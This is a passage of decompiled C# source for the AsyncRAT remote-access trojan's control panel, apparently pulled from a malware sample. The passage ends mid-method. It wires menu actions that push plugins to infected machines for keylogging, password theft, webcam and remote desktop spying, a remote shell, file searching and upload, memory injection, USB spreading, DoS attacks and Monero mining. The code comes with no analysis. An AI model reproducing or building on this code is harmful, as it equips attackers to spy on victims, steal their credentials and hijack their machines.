// Decompiled with JetBrains decompiler
// Type: Server.Form1
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
  public class Form1 : Form
  {
    private bool trans;
    public cGeoMain cGeoMain = new cGeoMain();
    private List<AsyncTask> getTasks = new List<AsyncTask>();
    private ListViewColumnSorter lvwColumnSorter;
    private readonly FormDOS formDOS;
    private IContainer components;
    public ListView listView1;
    private ColumnHeader lv_ip;
    private ColumnHeader lv_user;
    private ColumnHeader lv_os;
    private ContextMenuStrip contextMenuClient;
    private StatusStrip statusStrip1;
    private ToolStripStatusLabel toolStripStatusLabel1;
    private System.Windows.Forms.Timer ping;
    private System.Windows.Forms.Timer UpdateUI;
    private ToolStripMenuItem sENDFILEToolStripMenuItem;
    public ColumnHeader lv_hwid;
    private ColumnHeader lv_country;
    private ToolStripMenuItem bUILDERToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator2;
    private ColumnHeader lv_version;
    private TabControl tabControl1;
    private TabPage tabPage1;
    private TabPage tabPage2;
    public ListView listView2;
    private ColumnHeader columnHeader1;
    private ColumnHeader columnHeader2;
    private PerformanceCounter performanceCounter1;
    private PerformanceCounter performanceCounter2;
    public ColumnHeader lv_act;
    private ToolStripMenuItem aBOUTToolStripMenuItem;
    private TabPage tabPage3;
    private ContextMenuStrip contextMenuThumbnail;
    private ToolStripMenuItem sTARTToolStripMenuItem;
    private ToolStripMenuItem sTOPToolStripMenuItem;
    public ImageList ThumbnailImageList;
    public ListView listView3;
    public NotifyIcon notifyIcon1;
    private ColumnHeader lv_admin;
    private TabPage tabPage4;
    private ColumnHeader columnHeader4;
    private ColumnHeader columnHeader5;
    private ContextMenuStrip contextMenuTasks;
    private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;
    public ListView listView4;
    private ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;
    private ToolStripMenuItem uPDATEToolStripMenuItem1;
    private ToolStripSeparator toolStripSeparator4;
    private ToolStripMenuItem dELETETASKToolStripMenuItem;
    private System.Windows.Forms.Timer TimerTask;
    private ToolStripMenuItem tOMEMORYToolStripMenuItem;
    private ToolStripMenuItem tODISKToolStripMenuItem;
    private ContextMenuStrip contextMenuLogs;
    private ToolStripMenuItem cLEARToolStripMenuItem;
    private ToolStripMenuItem monitoringToolStripMenuItem;
    private ToolStripMenuItem remoteDesktopToolStripMenuItem1;
    private ToolStripMenuItem keyloggerToolStripMenuItem1;
    private ToolStripMenuItem passwordRecoveryToolStripMenuItem1;
    private ToolStripMenuItem fileManagerToolStripMenuItem1;
    private ToolStripMenuItem processManagerToolStripMenuItem1;
    private ToolStripMenuItem reportWindowToolStripMenuItem;
    private ToolStripMenuItem miscellaneousToolStripMenuItem;
    private ToolStripMenuItem botsKillerToolStripMenuItem;
    private ToolStripMenuItem uSBSpreadToolStripMenuItem1;
    private ToolStripMenuItem extraToolStripMenuItem;
    private ToolStripMenuItem visitWebsiteToolStripMenuItem1;
    private ToolStripMenuItem sendMessageBoxToolStripMenuItem1;
    private ToolStripMenuItem chatToolStripMenuItem1;
    private ToolStripMenuItem runToolStripMenuItem1;
    private ToolStripMenuItem stopToolStripMenuItem2;
    private ToolStripMenuItem systemToolStripMenuItem;
    private ToolStripMenuItem pCToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripMenuItem seedTorrentToolStripMenuItem1;
    private ToolStripMenuItem remoteShellToolStripMenuItem1;
    private ToolStripMenuItem dOSAttackToolStripMenuItem;
    private ToolStripStatusLabel toolStripStatusLabel2;
    private ToolStripMenuItem executeNETCodeToolStripMenuItem;
    private ColumnHeader lv_av;
    private ToolStripMenuItem pASSWORDRECOVERYToolStripMenuItem;
    private ToolStripMenuItem blankScreenToolStripMenuItem;
    private ToolStripMenuItem getAdminPrivilegesToolStripMenuItem;
    private ToolStripMenuItem disableWindowsDefenderToolStripMenuItem;
    private ToolStripMenuItem webcamToolStripMenuItem;
    private ToolStripMenuItem xMRMinerToolStripMenuItem;
    private ToolStripMenuItem runToolStripMenuItem;
    private ToolStripMenuItem killToolStripMenuItem;
    private ToolStripMenuItem serverToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator5;
    private ToolStripMenuItem blockClientsToolStripMenuItem;
    private ColumnHeader lv_ins;
    public ColumnHeader lv_ping;
    private ToolStripMenuItem minerToolStripMenuItem1;
    private ToolStripMenuItem runToolStripMenuItem2;
    private ToolStripMenuItem stopToolStripMenuItem1;
    private ToolStripMenuItem setWallpaperToolStripMenuItem;
    private ToolStripMenuItem filesSearcherToolStripMenuItem;
    private ColumnHeader lv_group;
    private ToolStripMenuItem clientToolStripMenuItem;
    private ToolStripMenuItem closeToolStripMenuItem1;
    private ToolStripMenuItem restartToolStripMenuItem2;
    private ToolStripMenuItem updateToolStripMenuItem2;
    private ToolStripMenuItem uninstallToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator3;
    private ToolStripMenuItem showFolderToolStripMenuItem;
    private ToolStripMenuItem logoffToolStripMenuItem1;
    private ToolStripMenuItem restartToolStripMenuItem3;
    private ToolStripMenuItem shutdownToolStripMenuItem1;

    public Form1()
    {
      this.InitializeComponent();
      Form1.SetWindowTheme(this.listView1.Handle, "explorer", (string) null);
      this.Opacity = 0.0;
      FormDOS formDos = new FormDOS();
      formDos.Name = "DOS";
      formDos.Text = "DOS";
      this.formDOS = formDos;
      this.listView1.SmallImageList = this.cGeoMain.cImageList;
      this.listView1.LargeImageList = this.cGeoMain.cImageList;
    }

    private void CheckFiles()
    {
      try
      {
        if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
        {
          int num = (int) MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
          Environment.Exit(0);
        }
        if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
        {
          int num1 = (int) MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");
        }
        if (Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
          return;
        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private Clients[] GetSelectedClients()
    {
      List<Clients> clientsList = new List<Clients>();
      this.Invoke((Delegate) (() =>
      {
        lock (Settings.LockListviewClients)
        {
          if (this.listView1.SelectedItems.Count == 0)
            return;
          foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
            clientsList.Add((Clients) selectedItem.Tag);
        }
      }));
      return clientsList.ToArray();
    }

    private Clients[] GetAllClients()
    {
      List<Clients> clientsList = new List<Clients>();
      this.Invoke((Delegate) (() =>
      {
        lock (Settings.LockListviewClients)
        {
          if (this.listView1.Items.Count == 0)
            return;
          foreach (ListViewItem listViewItem in this.listView1.Items)
            clientsList.Add((Clients) listViewItem.Tag);
        }
      }));
      return clientsList.ToArray();
    }

    private async void Connect()
    {
      try
      {
        await Task.Delay(1000);
        string ports = Server.Properties.Settings.Default.Ports;
        char[] chArray = new char[1]{ ',' };
        foreach (string str in ports.Split(chArray))
        {
          if (!string.IsNullOrWhiteSpace(str))
            new Thread(new ParameterizedThreadStart(new Listener().Connect))
            {
              IsBackground = true
            }.Start((object) Convert.ToInt32(str.ToString().Trim()));
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
        Environment.Exit(0);
      }
    }

    private async void Form1_Load(object sender, EventArgs e)
    {
      Form1 o = this;
      ListviewDoubleBuffer.Enable(o.listView1);
      ListviewDoubleBuffer.Enable(o.listView2);
      ListviewDoubleBuffer.Enable(o.listView3);
      try
      {
        string txtBlocked = Server.Properties.Settings.Default.txtBlocked;
        char[] chArray = new char[1]{ ',' };
        foreach (string str in txtBlocked.Split(chArray))
        {
          if (!string.IsNullOrWhiteSpace(str))
            Settings.Blocked.Add(str);
        }
      }
      catch
      {
      }
      o.CheckFiles();
      o.lvwColumnSorter = new ListViewColumnSorter();
      o.listView1.ListViewItemSorter = (IComparer) o.lvwColumnSorter;
      o.Text = Settings.Version ?? "";
      using (FormPorts formPorts = new FormPorts())
      {
        int num = (int) formPorts.ShowDialog();
      }
      await Methods.FadeIn((Form) o, 5);
      o.trans = true;
      if (Server.Properties.Settings.Default.Notification)
        o.toolStripStatusLabel2.ForeColor = Color.Green;
      else
        o.toolStripStatusLabel2.ForeColor = Color.Black;
      // ISSUE: reference to a compiler-generated method
      new Thread(new ThreadStart(o.\u003CForm1_Load\u003Eb__9_0)).Start();
    }

    private void Form1_Activated(object sender, EventArgs e)
    {
      if (!this.trans)
        return;
      this.Opacity = 1.0;
    }

    private void Form1_Deactivate(object sender, EventArgs e) => this.Opacity = 0.95;

    private void Form1_FormClosed(object sender, FormClosedEventArgs e)
    {
      this.notifyIcon1.Dispose();
      Environment.Exit(0);
    }

    private void listView1_KeyDown(object sender, KeyEventArgs e)
    {
      if (this.listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
        return;
      foreach (ListViewItem listViewItem in this.listView1.Items)
        listViewItem.Selected = true;
    }

    private void listView1_MouseMove(object sender, MouseEventArgs e)
    {
      if (this.listView1.Items.Count <= 1)
        return;
      ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
      if (e.Button != MouseButtons.Left || listViewHitTestInfo.Item == null && listViewHitTestInfo.SubItem == null)
        return;
      this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
    }

    private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
    {
      if (e.Column == this.lvwColumnSorter.SortColumn)
      {
        this.lvwColumnSorter.Order = this.lvwColumnSorter.Order != SortOrder.Ascending ? SortOrder.Ascending : SortOrder.Descending;
      }
      else
      {
        this.lvwColumnSorter.SortColumn = e.Column;
        this.lvwColumnSorter.Order = SortOrder.Ascending;
      }
      this.listView1.Sort();
    }

    private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
    {
      if (Server.Properties.Settings.Default.Notification)
      {
        Server.Properties.Settings.Default.Notification = false;
        this.toolStripStatusLabel2.ForeColor = Color.Black;
      }
      else
      {
        Server.Properties.Settings.Default.Notification = true;
        this.toolStripStatusLabel2.ForeColor = Color.Green;
      }
      Server.Properties.Settings.Default.Save();
    }

    private void ping_Tick(object sender, EventArgs e)
    {
      if (this.listView1.Items.Count <= 0)
        return;
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "Ping";
      msgPack.ForcePathObject("Message").AsString = "This is a ping!";
      foreach (Clients allClient in this.GetAllClients())
        ThreadPool.QueueUserWorkItem(new WaitCallback(allClient.Send), (object) msgPack.Encode2Bytes());
      GC.Collect();
    }

    private void UpdateUI_Tick(object sender, EventArgs e)
    {
      this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
      lock (Settings.LockListviewClients)
      {
        ToolStripStatusLabel stripStatusLabel1 = this.toolStripStatusLabel1;
        object[] objArray = new object[6];
        int count = this.listView1.Items.Count;
        objArray[0] = (object) count.ToString();
        count = this.listView1.SelectedItems.Count;
        objArray[1] = (object) count.ToString();
        objArray[2] = (object) Methods.BytesToString(Settings.SentValue).ToString();
        objArray[3] = (object) Methods.BytesToString(Settings.ReceivedValue).ToString();
        objArray[4] = (object) (int) this.performanceCounter1.NextValue();
        objArray[5] = (object) (int) this.performanceCounter2.NextValue();
        string str = string.Format("Online {0}     Selected {1}                    Sent {2}     Received {3}                    CPU {4}%     RAM {5}%", objArray);
        stripStatusLabel1.Text = str;
      }
    }

    private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        FormSendFileToMemory sendFileToMemory = new FormSendFileToMemory();
        int num = (int) sendFileToMemory.ShowDialog();
        if (sendFileToMemory.IsOK)
        {
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "sendMemory";
          msgPack1.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(sendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
          msgPack1.ForcePathObject("Inject").AsString = sendFileToMemory.comboBox1.SelectedIndex != 0 ? sendFileToMemory.comboBox2.Text : "";
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            selectedClient.LV.ForeColor = Color.Red;
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
        sendFileToMemory.Close();
        sendFileToMemory.Dispose();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private async void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        using (OpenFileDialog openFileDialog = new OpenFileDialog())
        {
          openFileDialog.Multiselect = true;
          if (openFileDialog.ShowDialog() == DialogResult.OK)
          {
            MsgPack packet = new MsgPack();
            packet.ForcePathObject("Packet").AsString = "sendFile";
            packet.ForcePathObject("Update").AsString = "false";
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "plugin";
            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
            Clients[] clientsArray = this.GetSelectedClients();
            for (int index1 = 0; index1 < clientsArray.Length; ++index1)
            {
              Clients client = clientsArray[index1];
              client.LV.ForeColor = Color.Red;
              string[] strArray = openFileDialog.FileNames;
              for (int index2 = 0; index2 < strArray.Length; ++index2)
              {
                string file = strArray[index2];
                await Task.Run((Action) (() =>
                {
                  packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                  packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
                  msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                }));
                ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), (object) msgpack.Encode2Bytes());
              }
              strArray = (string[]) null;
              client = (Clients) null;
            }
            clientsArray = (Clients[]) null;
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormRemoteDesktop) Application.OpenForms["RemoteDesktop:" + selectedClient.ID] == null)
          {
            FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
            formRemoteDesktop.Name = "RemoteDesktop:" + selectedClient.ID;
            formRemoteDesktop.F = this;
            formRemoteDesktop.Text = "RemoteDesktop:" + selectedClient.ID;
            formRemoteDesktop.ParentClient = selectedClient;
            formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "RemoteDesktop");
            formRemoteDesktop.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\LimeLogger.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormKeylogger) Application.OpenForms["keyLogger:" + selectedClient.ID] == null)
          {
            FormKeylogger formKeylogger = new FormKeylogger();
            formKeylogger.Name = "keyLogger:" + selectedClient.ID;
            formKeylogger.Text = "keyLogger:" + selectedClient.ID;
            formKeylogger.F = this;
            formKeylogger.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormFileManager) Application.OpenForms["fileManager:" + selectedClient.ID] == null)
          {
            FormFileManager formFileManager = new FormFileManager();
            formFileManager.Name = "fileManager:" + selectedClient.ID;
            formFileManager.Text = "fileManager:" + selectedClient.ID;
            formFileManager.F = this;
            formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID);
            formFileManager.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
        new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
        this.tabControl1.SelectedIndex = 1;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormProcessManager) Application.OpenForms["processManager:" + selectedClient.ID] == null)
          {
            FormProcessManager formProcessManager = new FormProcessManager();
            formProcessManager.Name = "processManager:" + selectedClient.ID;
            formProcessManager.Text = "processManager:" + selectedClient.ID;
            formProcessManager.F = this;
            formProcessManager.ParentClient = selectedClient;
            formProcessManager.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        string str = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam");
        if (string.IsNullOrEmpty(str))
          return;
        lock (Settings.LockReportWindowClients)
        {
          Settings.ReportWindowClients.Clear();
          Settings.ReportWindowClients = new List<Clients>();
        }
        Settings.ReportWindow = true;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "reportWindow";
        msgPack1.ForcePathObject("Option").AsString = "run";
        msgPack1.ForcePathObject("Title").AsString = str;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      try
      {
        Settings.ReportWindow = false;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "reportWindow";
        msgPack.ForcePathObject("Option").AsString = "stop";
        lock (Settings.LockReportWindowClients)
        {
          foreach (Clients reportWindowClient in Settings.ReportWindowClients)
            ThreadPool.QueueUserWorkItem(new WaitCallback(reportWindowClient.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "plugin";
        msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormWebcam) Application.OpenForms["Webcam:" + selectedClient.ID] == null)
          {
            FormWebcam formWebcam = new FormWebcam();
            formWebcam.Name = "Webcam:" + selectedClient.ID;
            formWebcam.F = this;
            formWebcam.Text = "Webcam:" + selectedClient.ID;
            formWebcam.ParentClient = selectedClient;
            formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", selectedClient.ID, "Camera");
            formWebcam.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "botKiller";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
        this.tabControl1.SelectedIndex = 1;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "limeUSB";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
    {
      using (FormTorrent formTorrent = new FormTorrent())
      {
        int num = (int) formTorrent.ShowDialog();
      }
    }

    private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "shell";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          if ((FormShell) Application.OpenForms["shell:" + selectedClient.ID] == null)
          {
            FormShell formShell = new FormShell();
            formShell.Name = "shell:" + selectedClient.ID;
            formShell.Text = "shell:" + selectedClient.ID;
            formShell.F = this;
            formShell.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.Items.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "dosAdd";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        this.formDOS.Show();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count <= 0)
        return;
      using (FormDotNetEditor formDotNetEditor = new FormDotNetEditor())
      {
        int num = (int) formDotNetEditor.ShowDialog();
      }
    }

    private void RunToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        using (FormMiner formMiner = new FormMiner())
        {
          if (formMiner.ShowDialog() != DialogResult.OK)
            return;
          if (!File.Exists("Plugins\\xmrig.bin"))
            File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
          MsgPack msgPack1 = new MsgPack();
          msgPack1.ForcePathObject("Packet").AsString = "xmr";
          msgPack1.ForcePathObject("Command").AsString = "run";
          XmrSettings.Pool = formMiner.txtPool.Text;
          msgPack1.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
          XmrSettings.Wallet = formMiner.txtWallet.Text;
          msgPack1.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
          XmrSettings.Pass = formMiner.txtPass.Text;
          msgPack1.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
          XmrSettings.InjectTo = formMiner.comboInjection.Text;
          msgPack1.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
          XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
          msgPack1.ForcePathObject("Hash").AsString = XmrSettings.Hash;
          MsgPack msgPack2 = new MsgPack();
          msgPack2.ForcePathObject("Packet").AsString = "plugin";
          msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
          msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
          foreach (Clients selectedClient in this.GetSelectedClients())
          {
            selectedClient.LV.ForeColor = Color.Red;
            ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void KillToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "xmr";
        msgPack1.ForcePathObject("Command").AsString = "stop";
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          selectedClient.LV.ForeColor = Color.Red;
          ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClient.Send), (object) msgPack2.Encode2Bytes());
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
    {
      using (FormFileSearcher formFileSearcher = new FormFileSearcher())
      {
        if (formFileSearcher.ShowDialog() != DialogResult.OK || this.listView1.SelectedItems.Count <= 0)
          return;
        MsgPack msgPack1 = new MsgPack();
        msgPack1.ForcePathObject("Packet").AsString = "fileSearcher";
        msgPack1.ForcePathObject("SizeLimit").AsInteger = (long) formFileSearcher.numericUpDown1.Value * 1000L * 1000L;
        msgPack1.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
        MsgPack msgPack2 = new MsgPack();
        msgPack2.ForcePathObject("Packet").AsString = "plugin";
        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack1.Encode2Bytes());
        foreach (Clients selectedClient in this.GetSelectedClients())
        {
          selectedClient.LV.ForeColor = Color.Red;
